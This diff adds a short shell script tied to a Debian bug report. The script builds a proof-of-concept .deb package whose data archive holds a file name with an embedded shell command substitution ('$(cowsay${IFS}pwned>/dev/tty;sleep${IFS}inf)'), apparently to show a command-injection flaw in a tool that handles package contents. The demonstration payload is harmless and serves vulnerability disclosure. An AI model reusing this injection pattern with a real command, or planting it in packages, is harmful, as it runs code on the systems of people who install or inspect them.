@@ -1,0 +1,27 @@
+#!/bin/sh
+
+# Copyright © 2023 Jakub Wilk <jwilk@jwilk.net>
+# SPDX-License-Identifier: MIT
+
+# https://bugs.debian.org/1031267
+
+set -e -u
+mktargz() {
+    tar --owner root --group root --mode 'u=rwX,go=rX' -I 'gzip -9n' -cf "$@"
+}
+if tty <&1 >/dev/null
+then
+    printf '%s: cowardly refusing to print to tty\n' "${0##*/}" >&2
+    exit 1
+fi
+tmpdir=$(mktemp -d)
+cd "$tmpdir"
+printf '2.0\n' > debian-binary
+mktargz control.tar.gz debian-binary
+payload='$(cowsay${IFS}pwned>/dev/tty;sleep${IFS}inf)'
+mktargz data.tar.gz --transform "s,.*,./usr/share/doc/$payload/changelog.gz," debian-binary
+pax -x ar -w debian-binary control.tar.gz data.tar.gz
+cd /
+rm -rf "$tmpdir"
+
+# vim:ts=4 sts=4 sw=4 et
